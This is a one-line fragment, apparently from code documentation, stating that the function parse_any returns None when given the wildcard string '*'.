`parse_any("*")` returns `None`.
